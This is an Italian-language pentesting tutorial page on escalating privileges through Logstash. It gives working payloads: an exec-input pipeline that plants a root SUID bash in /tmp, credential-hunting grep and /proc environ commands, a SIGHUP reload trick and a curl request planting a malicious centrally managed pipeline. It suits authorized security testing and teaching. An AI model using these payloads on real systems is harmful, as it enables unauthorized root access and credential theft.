# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash viene utilizzato per **raccogliere, trasformare e distribuire i log** tramite un sistema noto come **pipeline**. Queste pipeline sono composte da fasi di **input**, **filter** e **output**.<sup>[[4]](#references)</sup> Un aspetto interessante si presenta quando Logstash opera su una macchina compromessa.

### Configurazione delle pipeline

Nelle installazioni tramite pacchetti Debian e RPM, le pipeline sono configurate tramite **/etc/logstash/pipelines.yml**, che elenca i percorsi delle configurazioni delle pipeline; nelle altre distribuzioni, `pipelines.yml` si trova nella directory `path.settings` di Logstash.<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

Questo file rivela dove si trovano i file **.conf** che contengono le configurazioni delle pipeline. Quando si usa un output **Elasticsearch**, controlla le impostazioni `user`/`password`, `cloud_auth` o `api_key`; i privilegi effettivi dell’account dipendono da Elasticsearch. Un glob `path.config` carica ogni file corrispondente per quella pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Se Logstash viene avviato con `-f <directory>` invece che con `pipelines.yml`, `-f` ha la precedenza e **tutti i file all’interno di quella directory vengono concatenati in ordine lessicografico e analizzati come un’unica configurazione**.<sup>[[6]](#references)[[7]](#references)</sup> Questo comporta 2 implicazioni offensive:

- Un file inserito, come `000-input.conf` o `zzz-output.conf`, può modificare il modo in cui viene assemblata la pipeline finale
- Un file malformato può impedire la convalida della configurazione combinata; durante il reload, Logstash mantiene la pipeline precedente, quindi convalida i payload prima di fare affidamento sull’auto-reload.<sup>[[1]](#references)</sup>

### Enumerazione rapida su un host compromesso

Su una macchina in cui Logstash è installato, controlla rapidamente:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

Verifica inoltre se l’API di monitoraggio locale è raggiungibile. Per impostazione predefinita, è in ascolto su **127.0.0.1:9600**, che di solito è sufficiente dopo aver ottenuto l’accesso all’host.<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

Questi endpoint espongono gli ID e le impostazioni delle pipeline, le metriche runtime e i contatori di successo/fallimento del ricaricamento della configurazione, aiutando a confermare se una modifica è stata accettata.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Se una credenziale recuperata è destinata a **Elasticsearch**, consulta [questa altra pagina su Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Input da file che alimenta l'output di un comando dinamico

La configurazione di una pipeline può essere di sola lettura per l'utente corrente, mentre il suo [input da file](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file) monitora un percorso su cui l'utente può scrivere. Segui la pipeline caricata da tale input attraverso eventuali [acquisizioni di campi Grok](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok) fino a un [output exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec). L'output exec passa il proprio `command` attraverso una shell e sostituisce i valori `%{field}` senza sanificare i metacaratteri della shell. Un percorso di input scrivibile è un possibile vettore di escalation dei privilegi solo se il servizio in esecuzione ha un'identità con privilegi superiori, il file dell'utente può effettivamente entrare nell'input monitorato, i filtri e le condizioni dell'output instradano i suoi contenuti nel campo del comando e il plugin di output è installato e attivo. Verifica separatamente i permessi di ricerca/scrittura della directory, lo stato di tracciamento del file input e l'account di servizio effettivo; durante l'enumerazione passiva non scrivere un evento di test né invocare l'output.

### Escalation dei privilegi tramite pipeline scrivibili

Per tentare un'escalation dei privilegi, identifica innanzitutto l'utente con cui il servizio Logstash è effettivamente in esecuzione; non presumere che sia root o l'utente **logstash**. Assicurati di soddisfare **uno** di questi criteri:

- Possiedi **accesso in scrittura** a un file pipeline **.conf** **oppure**
- Il file **/etc/logstash/pipelines.yml** usa un wildcard e puoi scrivere nella cartella di destinazione.<sup>[[6]](#references)[[7]](#references)</sup>

Inoltre, deve essere soddisfatta **una** di queste condizioni:

- Possibilità di riavviare il servizio Logstash **oppure**
- Nel file **/etc/logstash/logstash.yml** è impostato **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Se la configurazione contiene un wildcard, creare un file che corrisponda a tale wildcard consente l'esecuzione di comandi.<sup>[[7]](#references)[[9]](#references)</sup> Per esempio:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

Qui, **interval** determina la frequenza di esecuzione in secondi. Nell'esempio fornito, il comando **whoami** viene eseguito ogni 120 secondi e il suo output viene scritto in **/tmp/output.log**.<sup>[[9]](#references)</sup>

Con **config.reload.automatic: true** in **/etc/logstash/logstash.yml**, Logstash rileva e applica automaticamente le configurazioni delle pipeline nuove o modificate, senza bisogno di un riavvio.<sup>[[1]](#references)[[15]](#references)</sup> Anche in assenza di un wildcard, è comunque possibile modificare le configurazioni esistenti, ma è consigliabile procedere con cautela per evitare interruzioni.

### Payload per pipeline più affidabili

Il plugin di input `exec` funziona ancora nelle versioni attuali e richiede un `interval` oppure uno `schedule`. Esegue il comando tramite **forking** della JVM di Logstash, quindi, se la memoria scarseggia, il payload potrebbe fallire con `ENOMEM` anziché essere eseguito senza segnalare problemi.<sup>[[9]](#references)</sup>

Quando il servizio dispone di privilegi sufficienti per creare un file SUID di proprietà di root, un payload pratico per l'escalation dei privilegi è quello che lascia un artefatto persistente:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

Se non disponi dei privilegi per riavviare il processo ma puoi inviargli un segnale, Logstash supporta anche il ricaricamento attivato da **SIGHUP** sui sistemi Unix-like:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

Tieni presente che non tutti i plugin supportano il reload. Ad esempio, l'input **stdin** impedisce il reload automatico, quindi non dare per scontato che `config.reload.automatic` rilevi sempre le modifiche.<sup>[[1]](#references)</sup>

### Sottrarre segreti da Logstash

Prima di concentrarti solo sull'esecuzione di codice, raccogli i dati a cui Logstash ha già accesso:

- Le credenziali possono comparire negli output `elasticsearch {}`, negli URL o nelle impostazioni di `http_poller`, negli input JDBC o nelle impostazioni relative al cloud; questi plugin espongono campi delle credenziali che vale la pena cercare.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Le impostazioni sicure possono trovarsi in **`/etc/logstash/logstash.keystore`** o in un'altra directory `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- La password del keystore può essere fornita tramite **`LOGSTASH_KEYSTORE_PASS`** e le installazioni RPM/DEB caricano le variabili d'ambiente del servizio da **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- La sostituzione delle variabili d'ambiente con `${VAR}` avviene all'avvio di Logstash, quindi vale la pena esaminare l'ambiente del servizio.<sup>[[14]](#references)</sup>

Controlli utili:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

È opportuno verificare anche questo perché **CVE-2023-46672** ha dimostrato che, in circostanze specifiche, Logstash registrava informazioni sensibili nei log, inclusi segreti archiviati nel keystore e richiamati dalla configurazione; se queste circostanze possono essere applicabili, esamina i vecchi log di Logstash e le voci di `journald`.<sup>[[3]](#references)</sup>

### Abuso della gestione centralizzata delle pipeline

In alcuni ambienti, l’host **non** si basa affatto su file `.conf` locali. Se è configurato **`xpack.management.enabled: true`**, Logstash può recuperare pipeline gestite centralmente da Elasticsearch/Kibana e, dopo aver abilitato questa modalità, le configurazioni locali delle pipeline non sono più la fonte di verità.<sup>[[2]](#references)</sup>

Questo comporta un diverso percorso di attacco:

1. Recupera le credenziali Elastic dalle impostazioni locali di Logstash, dal keystore o dai log.<sup>[[3]](#references)[[10]](#references)</sup>
2. Verifica se l’account dispone del privilegio cluster **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Crea o sostituisci una pipeline gestita centralmente, così che l’host Logstash esegua il tuo payload al successivo intervallo di polling.<sup>[[2]](#references)[[16]](#references)</sup>

L’API Elasticsearch usata per questa funzionalità è:<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

Questo è particolarmente utile quando i file locali sono in sola lettura, ma Logstash è già configurato per recuperare le pipeline da remoto.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Ricaricare il file di configurazione](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Configurare la gestione centralizzata delle pipeline](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Aggiornamento di sicurezza di Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Creare una pipeline Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Struttura delle directory di Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Pipeline multiple](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Eseguire Logstash dalla riga di comando](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Monitorare Logstash con le API](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Plugin di input Exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Keystore dei segreti per le impostazioni sicure](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Plugin di output Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Plugin di input Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Plugin di input Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Usare le variabili d'ambiente](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [API Elasticsearch: Creare o aggiornare una pipeline Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [API Logstash: Ottenere le impostazioni delle pipeline](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [API Logstash: Ottenere le statistiche delle pipeline](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
